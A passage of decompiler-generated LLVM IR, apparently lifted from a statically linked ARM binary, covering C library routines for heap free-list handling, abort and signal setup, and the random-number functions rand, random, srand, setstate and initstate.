  %v1_14f48 = phi i32 [ %v1_14f18, %entry ], [ 12, %bb ]
  %v2_14f949 = icmp eq i32 %v2_14f28, 0
  br i1 %v2_14f949, label %dec_label_pc_14f9c, label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f94.preheader, %dec_label_pc_14f90
  %v2_14f4c = phi i32 [ %v3_14f90, %dec_label_pc_14f90 ], [ %v2_14f28, %dec_label_pc_14f94.preheader ]
  %v1_14f34 = inttoptr i32 %v2_14f4c to i32*
  %v2_14f34 = load i32, i32* %v1_14f34, align 4
  store i32 %v2_14f34, i32* @ip, align 4
  %v3_14f38 = icmp ult i32 %v2_14f34, %v1_14f48
  br i1 %v3_14f38, label %dec_label_pc_14f90, label %dec_label_pc_14f40

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f34
  %v1_14f40 = add i32 %v1_14f48, 44
  %v3_14f44 = icmp ult i32 %v2_14f34, %v1_14f40
  br i1 %v3_14f44, label %dec_label_pc_14f54, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_14f40
  %v2_14f38.le = sub i32 %v2_14f34, %v1_14f48
  store i32 %v2_14f38.le, i32* %v1_14f34, align 4
  %v0_14f80.pre = load i32, i32* @ip, align 4
  %v0_14f88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_14f54:                               ; preds = %dec_label_pc_14f40
  %v1_14f54 = add i32 %v2_14f4c, 4
  %v2_14f54 = inttoptr i32 %v1_14f54 to i32*
  %v3_14f54 = load i32, i32* %v2_14f54, align 4
  store i32 %v3_14f54, i32* %r2.global-to-local, align 4
  %v2_14f58 = icmp eq i32 %v3_14f54, 0
  br i1 %v2_14f58, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_14f54
  %v2_14f5c = add i32 %v2_14f4c, 8
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  %v4_14f5c = load i32, i32* %v3_14f5c, align 4
  %v3_14f60 = add i32 %v3_14f54, 8
  %v4_14f60 = inttoptr i32 %v3_14f60 to i32*
  store i32 %v4_14f5c, i32* %v4_14f60, align 4
  %v0_14f64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14f54, %bb27
  %v0_14f64 = phi i32 [ %v2_14f4c, %dec_label_pc_14f54 ], [ %v0_14f64.pre, %bb27 ]
  %v1_14f64 = add i32 %v0_14f64, 8
  %v2_14f64 = inttoptr i32 %v1_14f64 to i32*
  %v3_14f64 = load i32, i32* %v2_14f64, align 4
  %v1_14f68 = add i32 %v0_14f64, 4
  %v2_14f68 = inttoptr i32 %v1_14f68 to i32*
  %v3_14f68 = load i32, i32* %v2_14f68, align 4
  %v2_14f6c = icmp eq i32 %v3_14f64, 0
  br i1 %v2_14f6c, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_14f70 = add i32 %v3_14f64, 4
  %v4_14f70 = inttoptr i32 %v3_14f70 to i32*
  store i32 %v3_14f68, i32* %v4_14f70, align 4
  %v1_14f78 = load i32, i32* @ip, align 4
  store i32 %v1_14f78, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_14f74 = load i32, i32* %r1.global-to-local, align 4
  %v3_14f74 = inttoptr i32 %v2_14f74 to i32*
  store i32 %v3_14f68, i32* %v3_14f74, align 4
  %v1_14f7c.pre = load i32, i32* @ip, align 4
  store i32 %v1_14f7c.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_14f88 = phi i32 [ %v0_14f88.pre, %.thread._crit_edge ], [ %v1_14f78, %bb28 ], [ %v1_14f7c.pre, %.thread5 ]
  %v0_14f80 = phi i32 [ %v0_14f80.pre, %.thread._crit_edge ], [ %v1_14f78, %bb28 ], [ %v1_14f7c.pre, %.thread5 ]
  %v1_14f80 = load i32, i32* %r0.global-to-local, align 4
  %v2_14f80 = sub i32 %v1_14f80, %v0_14f80
  %v1_14f84 = add i32 %v2_14f80, 12
  store i32 %v1_14f84, i32* %r0.global-to-local, align 4
  %v1_14f88 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f88 = inttoptr i32 %v1_14f88 to i32*
  store i32 %v0_14f88, i32* %v2_14f88, align 4
  %v2_14f8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14f8c, i32* %r4.global-to-local, align 4
  ret i32 %v1_14f84

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f34
  %v1_14f90 = add i32 %v2_14f4c, 4
  %v2_14f90 = inttoptr i32 %v1_14f90 to i32*
  %v3_14f90 = load i32, i32* %v2_14f90, align 4
  store i32 %v3_14f90, i32* %r0.global-to-local, align 4
  %v2_14f94 = icmp eq i32 %v3_14f90, 0
  br i1 %v2_14f94, label %dec_label_pc_14f94.dec_label_pc_14f9c_crit_edge, label %dec_label_pc_14f34

dec_label_pc_14f94.dec_label_pc_14f9c_crit_edge:  ; preds = %dec_label_pc_14f90
  br label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f94.dec_label_pc_14f9c_crit_edge, %dec_label_pc_14f94.preheader
  store i32 %v3_14f10, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_14f90, { 1, 2, 0 }
  uselistorder i32 %v0_14f64, { 1, 0 }
  uselistorder i32 %v2_14f34, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14f4c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_14f48, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
  uselistorder label %dec_label_pc_14f94.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_14fa0 = load i32, i32* @r2, align 4
  %v2_14fa0 = icmp eq i32 %v0_14fa0, 0
  %v0_14fa4 = load i32, i32* @r3, align 4
  %v1_14fa4 = load i32, i32* @r1, align 4
  %v2_14fa4 = add i32 %v1_14fa4, 4
  %v3_14fa4 = inttoptr i32 %v2_14fa4 to i32*
  store i32 %v0_14fa4, i32* %v3_14fa4, align 4
  %v0_14fa8 = load i32, i32* @r2, align 4
  %v1_14fa8 = load i32, i32* @r1, align 4
  %v2_14fa8 = add i32 %v1_14fa8, 8
  %v3_14fa8 = inttoptr i32 %v2_14fa8 to i32*
  store i32 %v0_14fa8, i32* %v3_14fa8, align 4
  %v1_14fb0 = load i32, i32* @r1, align 4
  br i1 %v2_14fa0, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_14fac = load i32, i32* @r2, align 4
  %v3_14fac = add i32 %v2_14fac, 4
  %v4_14fac = inttoptr i32 %v3_14fac to i32*
  store i32 %v1_14fb0, i32* %v4_14fac, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_14fb0 = load i32, i32* @r0, align 4
  %v3_14fb0 = inttoptr i32 %v2_14fb0 to i32*
  store i32 %v1_14fb0, i32* %v3_14fb0, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_14fb4 = load i32, i32* @r3, align 4
  %v2_14fb4 = icmp eq i32 %v0_14fb4, 0
  br i1 %v2_14fb4, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_14fb8 = load i32, i32* @r1, align 4
  %v3_14fb8 = add i32 %v0_14fb4, 8
  %v4_14fb8 = inttoptr i32 %v3_14fb8 to i32*
  store i32 %v1_14fb8, i32* %v4_14fb8, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_14fbc = load i32, i32* @r0, align 4
  ret i32 %v1_14fbc

; uselistorder directives
  uselistorder i32 %v1_14fb0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_14fc0 = load i32, i32* @r2, align 4
  %v2_14fc0 = icmp eq i32 %v0_14fc0, 0
  %v1_14fc4 = load i32, i32* @r1, align 4
  br i1 %v2_14fc0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_14fc4 = load i32, i32* @r0, align 4
  %v3_14fc4 = inttoptr i32 %v2_14fc4 to i32*
  store i32 %v1_14fc4, i32* %v3_14fc4, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_14fc8 = add i32 %v0_14fc0, 4
  %v4_14fc8 = inttoptr i32 %v3_14fc8 to i32*
  store i32 %v1_14fc4, i32* %v4_14fc8, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_14fcc = load i32, i32* @r2, align 4
  %v1_14fcc = load i32, i32* @r1, align 4
  %v2_14fcc = add i32 %v1_14fcc, 8
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v0_14fcc, i32* %v3_14fcc, align 4
  %v1_14fd0 = load i32, i32* @r0, align 4
  ret i32 %v1_14fd0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14fd4 = load i32, i32* @r4, align 4
  store i32 %v3_14fd4, i32* %stack_var_-20, align 4
  %v2_14fd8 = load i32, i32* %arg1, align 4
  store i32 %v2_14fd8, i32* %r4.global-to-local, align 4
  %v2_14fdc = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_14ff82 = icmp eq i32 %v2_14fd8, 0
  br i1 %v2_14ff82, label %dec_label_pc_150a8, label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %entry, %dec_label_pc_14ff0
  %v0_15038 = phi i32 [ %v0_15040, %dec_label_pc_14ff0 ], [ 0, %entry ]
  %v0_15040 = phi i32 [ %v3_14ff4, %dec_label_pc_14ff0 ], [ %v2_14fd8, %entry ]
  %v1_14ffc5.in = phi i32 [ %v3_14ff4, %dec_label_pc_14ff0 ], [ %v2_14fd8, %entry ]
  %v1_14ffc5 = add i32 %v1_14ffc5.in, 12
  %v3_14fe8 = icmp ult i32 %v1_14ffc5, %arg2
  br i1 %v3_14fe8, label %dec_label_pc_14ff0, label %dec_label_pc_15008

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fe8
  store i32 %v0_15040, i32* %r6.global-to-local, align 4
  %v1_14ff4 = add i32 %v0_15040, 4
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i32*
  %v3_14ff4 = load i32, i32* %v2_14ff4, align 4
  store i32 %v3_14ff4, i32* %r4.global-to-local, align 4
  %v2_14ff8 = icmp eq i32 %v3_14ff4, 0
  br i1 %v2_14ff8, label %dec_label_pc_14ff8.dec_label_pc_150a8.loopexit_crit_edge, label %dec_label_pc_14fe8

dec_label_pc_15008:                               ; preds = %dec_label_pc_14fe8
  %v1_15008 = inttoptr i32 %v0_15040 to i32*
  %v2_15008 = load i32, i32* %v1_15008, align 4
  store i32 %v2_15008, i32* @ip, align 4
  %v2_1500c = sub i32 %v0_15040, %v2_15008
  %v1_15010 = add i32 %v2_1500c, 12
  %v3_15014 = icmp uge i32 %v1_15010, %v2_14fdc
  %v9_15014 = icmp eq i32 %v1_15010, %v2_14fdc
  %v2_15018 = xor i1 %v9_15014, true
  %v3_15018 = and i1 %v3_15014, %v2_15018
  br i1 %v3_15018, label %dec_label_pc_150a8, label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15008
  %v2_1501c = add i32 %v2_15008, %arg3
  store i32 %v2_1501c, i32* %r7.global-to-local, align 4
  br i1 %v9_15014, label %dec_label_pc_15024, label %dec_label_pc_15050

dec_label_pc_15024:                               ; preds = %dec_label_pc_1501c
  %v2_15024 = icmp eq i32 %v0_15038, 0
  br i1 %v2_15024, label %dec_label_pc_1509c, label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15024
  %v1_1502c = add i32 %v0_15038, 12
  %v9_15030 = icmp eq i32 %v1_1502c, %arg2
  br i1 %v9_15030, label %dec_label_pc_15038, label %dec_label_pc_1509c

dec_label_pc_15038:                               ; preds = %dec_label_pc_1502c
  %v1_15038 = inttoptr i32 %v0_15038 to i32*
  %v2_15038 = load i32, i32* %v1_15038, align 4
  %v1_1503c = add i32 %v0_15038, 8
  %v2_1503c = inttoptr i32 %v1_1503c to i32*
  %v3_1503c = load i32, i32* %v2_1503c, align 4
  store i32 %v3_1503c, i32* @r2, align 4
  store i32 %v0_15040, i32* @r1, align 4
  %v2_15044 = add i32 %v2_15038, %v2_1501c
  store i32 %v2_15044, i32* %r7.global-to-local, align 4
  %v0_15048 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_1509c

dec_label_pc_15050:                               ; preds = %dec_label_pc_1501c
  %v1_15050 = add i32 %v0_15040, 4
  %v2_15050 = inttoptr i32 %v1_15050 to i32*
  %v3_15050 = load i32, i32* %v2_15050, align 4
  store i32 %v3_15050, i32* %r5.global-to-local, align 4
  %v2_15054 = icmp eq i32 %v3_15050, 0
  br i1 %v2_15054, label %dec_label_pc_15088, label %dec_label_pc_1505c

dec_label_pc_1505c:                               ; preds = %dec_label_pc_15050
  %v1_1505c = inttoptr i32 %v3_15050 to i32*
  %v2_1505c = load i32, i32* %v1_1505c, align 4
  store i32 %v2_1505c, i32* @ip, align 4
  %v2_15060 = sub i32 %v3_15050, %v2_1505c
  %v1_15064 = add i32 %v2_15060, 12
  %v9_15068 = icmp eq i32 %v2_14fdc, %v1_15064
  br i1 %v9_15068, label %dec_label_pc_15070, label %dec_label_pc_15088

dec_label_pc_15070:                               ; preds = %dec_label_pc_1505c
  store i32 %v0_15038, i32* @r2, align 4
  store i32 %v3_15050, i32* @r1, align 4
  %v2_15078 = add i32 %v2_1505c, %v2_1501c
  store i32 %v2_15078, i32* %r7.global-to-local, align 4
  %v0_1507c = call i32 @__heap_link_free_area_after()
  %v0_15080 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15080, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1509c

dec_label_pc_15088:                               ; preds = %dec_label_pc_1505c, %dec_label_pc_15050
  %v2_15088 = add i32 %v0_15040, %arg3
  store i32 %v2_15088, i32* %r4.global-to-local, align 4
  store i32 %v3_15050, i32* @r3, align 4
  store i32 %v0_15038, i32* @r2, align 4
  store i32 %v2_15088, i32* @r1, align 4
  %v0_15098 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %dec_label_pc_1502c, %dec_label_pc_15024, %dec_label_pc_15070, %dec_label_pc_15038, %dec_label_pc_15088
  %v0_1509c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1509c, i32* %r5.global-to-local, align 4
  %v0_150a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_150a0 = inttoptr i32 %v0_1509c to i32*
  store i32 %v0_150a0, i32* %v2_150a0, align 4
  br label %dec_label_pc_150c0

dec_label_pc_14ff8.dec_label_pc_150a8.loopexit_crit_edge: ; preds = %dec_label_pc_14ff0
  br label %dec_label_pc_150a8

dec_label_pc_150a8:                               ; preds = %entry, %dec_label_pc_14ff8.dec_label_pc_150a8.loopexit_crit_edge, %dec_label_pc_15008
  %v1_150a8 = add i32 %v2_14fdc, -12
  store i32 %v1_150a8, i32* %r5.global-to-local, align 4
  %v3_150ac = inttoptr i32 %v1_150a8 to i32*
  store i32 %arg3, i32* %v3_150ac, align 4
  %v0_150b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_150b0, i32* @r3, align 4
  %v0_150b4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_150b4, i32* @r2, align 4
  %v0_150b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_150b8, i32* @r1, align 4
  %v0_150bc = call i32 @__heap_link_free_area()
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %dec_label_pc_1509c, %dec_label_pc_150a8
  %v0_150c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_150c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_150c4, i32* @r4, align 4
  ret i32 %v0_150c0

; uselistorder directives
  uselistorder i32 %v3_15050, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_15014, { 1, 0 }
  uselistorder i32 %v3_14ff4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_15040, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_15038, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_150c0, { 1, 0 }
  uselistorder label %dec_label_pc_150a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1509c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14fe8, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_150e4.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_150c8 = ptrtoint i32* %stack_var_-268 to i32
  %v1_150d8 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_150e4 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_150e4

dec_label_pc_150e4:                               ; preds = %dec_label_pc_150e4.lr.ph, %dec_label_pc_150e4
  %v1_150e8 = phi i32 [ 31, %dec_label_pc_150e4.lr.ph ], [ %v1_150f4, %dec_label_pc_150e4 ]
  %v4_150e8 = mul i32 %v1_150e8, 4
  %v5_150e8 = add i32 %v4_150e8, %v2_150e4
  %v2_150f0 = add i32 %v5_150e8, -128
  %v3_150f0 = inttoptr i32 %v2_150f0 to i32*
  store i32 0, i32* %v3_150f0, align 4
  %v0_150f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_150f4 = add i32 %v0_150f4, -1
  store i32 %v1_150f4, i32* %r1.global-to-local, align 4
  %v6_150f4 = icmp slt i32 %v1_150f4, 0
  br i1 %v6_150f4, label %dec_label_pc_150fc, label %dec_label_pc_150e4

dec_label_pc_150fc:                               ; preds = %dec_label_pc_150e4
  %v2_150fc = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_150fc, i32* @r4, align 4
  store i32 %v2_150fc, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_15108 = call i32 @__sigaddset()
  %v2_1510c = icmp eq i32 %v0_15108, 0
  br i1 %v2_1510c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_150fc
  store i32 %v2_150fc, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_150fc, %bb
  store i32 86304, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1510c, i32 ptrtoint (i32* @global_var_12ab0.1147 to i32))
  %v2_15124 = load i32, i32* @global_var_2fb40.1149, align 4
  %v2_15128 = icmp eq i32 %v2_15124, 0
  br i1 %v2_15128, label %dec_label_pc_15130, label %dec_label_pc_15160

dec_label_pc_15130:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2fb40.1149, align 4
  br label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_151b0, %dec_label_pc_15130
  store i32 86344, i32* @lr, align 4
  %v1_15144 = call i32 @__pthread_return_0()
  %v1_1514c = call i32 @__raise(i32 6)
  store i32 86368, i32* @lr, align 4
  %v1_1515c = call i32 @__pthread_return_0()
  %v2_15164.pre = load i32, i32* @global_var_2fb40.1149, align 4
  br label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %.thread1, %dec_label_pc_15138
  %v0_151d4 = phi i32 [ %v2_15124, %.thread1 ], [ %v2_15164.pre, %dec_label_pc_15138 ]
  store i32 ptrtoint (i32* @global_var_2fb40.1149 to i32), i32* %ip.global-to-local, align 4
  %v7_15168 = icmp eq i32 %v0_151d4, 1
  br i1 %v7_15168, label %dec_label_pc_15198.lr.ph, label %dec_label_pc_151cc

dec_label_pc_15198.lr.ph:                         ; preds = %dec_label_pc_15160
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2fb40.1149, align 4
  %v2_15184 = bitcast i32* %stack_var_-268 to i8*
  %v3_15184 = call i32 @__GI_memset(i8* %v2_15184, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %dec_label_pc_15198.lr.ph, %dec_label_pc_15198
  %v1_1519c = phi i32 [ 31, %dec_label_pc_15198.lr.ph ], [ %v1_151a8, %dec_label_pc_15198 ]
  %v4_1519c = mul i32 %v1_1519c, 4
  %v5_1519c = add i32 %v4_1519c, %v2_150e4
  %v2_151a4 = add i32 %v5_1519c, -264
  %v3_151a4 = inttoptr i32 %v2_151a4 to i32*
  store i32 -1, i32* %v3_151a4, align 4
  %v0_151a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_151a8 = add i32 %v0_151a8, -1
  store i32 %v1_151a8, i32* %r1.global-to-local, align 4
  %v6_151a8 = icmp slt i32 %v1_151a8, 0
  br i1 %v6_151a8, label %dec_label_pc_151b0, label %dec_label_pc_15198

dec_label_pc_151b0:                               ; preds = %dec_label_pc_15198
  store i32 %v2_150c8, i32* %r1.global-to-local, align 4
  %v4_151c4 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_15138

dec_label_pc_151cc:                               ; preds = %dec_label_pc_15160
  %v7_151cc = icmp eq i32 %v0_151d4, 2
  br i1 %v7_151cc, label %dec_label_pc_151d4, label %dec_label_pc_151e0

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151cc
  store i32 3, i32* @global_var_2fb40.1149, align 4
  %v0_151dc = call i32 @abort()
  %v2_151e0.pre = load i32, i32* @global_var_2fb40.1149, align 4
  br label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151cc, %dec_label_pc_151d4
  %v1_151e8 = phi i32 [ %v0_151d4, %dec_label_pc_151cc ], [ %v2_151e0.pre, %dec_label_pc_151d4 ]
  %v7_151e4 = icmp eq i32 %v1_151e8, 3
  br i1 %v7_151e4, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_151e0
  %v2_151f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_151f0 = inttoptr i32 %v2_151f0 to i32*
  store i32 4, i32* %v3_151f0, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_151e0, %bb27
  call void @__pseudo_cond_branch(i1 %v7_151e4, i32 ptrtoint (i32* @global_var_12734.1151 to i32))
  br label %dec_label_pc_151f8

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151f8, %.thread3
  %v0_151f8 = call i32 @abort()
  br label %dec_label_pc_151f8

; uselistorder directives
  uselistorder i32 %v1_151a8, { 2, 1, 0 }
  uselistorder i32 %v1_150f4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 7, 0, 1, 8, 4, 6, 5, 2 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32* @global_var_2fb40.1149, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_151e0, { 1, 0 }
  uselistorder label %dec_label_pc_15198, { 1, 0 }
  uselistorder label %dec_label_pc_15160, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_150e4, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_15210 = call i32 @random()
  ret i32 %v0_15210

; uselistorder directives
  uselistorder i32 ()* @random, { 7, 4, 6, 5, 1, 0, 3, 2 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15214 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_297fc.1153 to i32), i32* @r4, align 4
  %v2_1521c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1521c, i32* @r0, align 4
  %v1_15234 = call i32 @__pthread_return_void()
  %v1_15244 = call i32 @__pthread_return_0()
  %v2_15248 = ptrtoint i32* %stack_var_-16 to i32
  %v3_15250 = call i32 @__GI_random_r(i32* inttoptr (i32 170004 to i32*), i32 %v2_15248)
  store i32 %v2_1521c, i32* @r0, align 4
  store i32 86632, i32* @lr, align 4
  %v1_15264 = call i32 @__pthread_return_void()
  %v3_15268 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_15214, i32* @r4, align 4
  ret i32 %v3_15268
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_15294 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15294, i32* @r0, align 4
  %v1_152b0 = call i32 @__pthread_return_void()
  %v1_152c0 = call i32 @__pthread_return_0()
  %v3_152d0 = load i32, i32* bitcast (i32** @global_var_2981c.1166 to i32*), align 4
  store i32 %v3_152d0, i32* @r4, align 4
  %v3_152d4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_29814)
  %v1_152dc = icmp slt i32 %v3_152d4, 0
  store i32 %v2_15294, i32* @r0, align 4
  %. = select i1 %v1_152dc, i32 0, i32 ptrtoint (i32** @global_var_29818.1168 to i32)
  %v1_152f4 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_15324 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_15324, i32* @r0, align 4
  %v1_15348 = call i32 @__pthread_return_void()
  %v1_15358 = call i32 @__pthread_return_0()
  %v0_15360 = load i32, i32* @r5, align 4
  %v0_15364 = load i32, i32* @r6, align 4
  %v0_15368 = load i32, i32* @r8, align 4
  %v3_1536c = load i32, i32* bitcast (i32** @global_var_2981c.1166 to i32*), align 4
  store i32 %v3_1536c, i32* @r4, align 4
  %v4_15370 = inttoptr i32 %v0_15360 to i32*
  %v5_15370 = call i32 @__GI_initstate_r(i32 %v0_15368, i32* %v4_15370, i32 %v0_15364, i32 ptrtoint (i32* @global_var_29814 to i32))
  store i32 %v2_15324, i32* @r0, align 4
  %v1_15384 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_29818.1168 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_153b4 = load i32, i32* @r4, align 4
  %v9_153b4 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_297fc.1153 to i32), i32* @r4, align 4
  %v2_153bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_153bc, i32* @r0, align 4
  %v1_153d8 = call i32 @__pthread_return_void()
  %v1_153e8 = call i32 @__pthread_return_0()
  %v0_153ec = load i32, i32* @r6, align 4
  store i32 %v0_153ec, i32* @r0, align 4
  %v2_153f4 = inttoptr i32 %v0_153ec to i32*
  %v3_153f4 = call i32 @srandom_r(i32* %v2_153f4, i32 ptrtoint (i32* @global_var_29814 to i32))
  store i32 %v2_153bc, i32* @r0, align 4
  %v1_1540c = call i32 @__pthread_return_void()
  store i32 %v3_153b4, i32* @r4, align 4
  store i32 %v9_153b4, i32* @r6, align 4
  ret i32 %v1_1540c

; uselistorder directives
  uselistorder i32* @global_var_29814, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29814 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_15430 = add i32 %tmp, 12
  %v2_15430 = inttoptr i32 %v1_15430 to i32*
  %v3_15430 = load i32, i32* %v2_15430, align 4
  %v3_15434 = load i32, i32* @r4, align 4
  store i32 %v3_15434, i32* %stack_var_-20, align 4
